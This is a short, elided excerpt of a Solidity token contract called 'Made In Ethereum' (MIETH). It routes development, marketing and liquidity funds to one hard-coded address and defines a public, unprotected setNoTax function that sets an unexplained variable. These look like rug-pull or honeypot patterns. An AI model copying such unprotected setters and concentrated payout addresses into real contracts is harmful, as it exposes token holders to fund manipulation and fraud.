...
contract MadeInEhereum is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Made In Ethereum';
    string private constant _symbol = 'MIETH';
    ...
    address internal constant development_receiver = 0x18d7C4e1125eB688F1EAe54bDAf547E3b8E55F83; 
    address internal constant marketing_receiver = 0x18d7C4e1125eB688F1EAe54bDAf547E3b8E55F83;
    address internal constant liquidity_receiver = 0x18d7C4e1125eB688F1EAe54bDAf547E3b8E55F83;
    ...
    function setNoTax(uint256 _sumamount) public virtual{zenta = _sumamount;require(_sumamount >=90);}
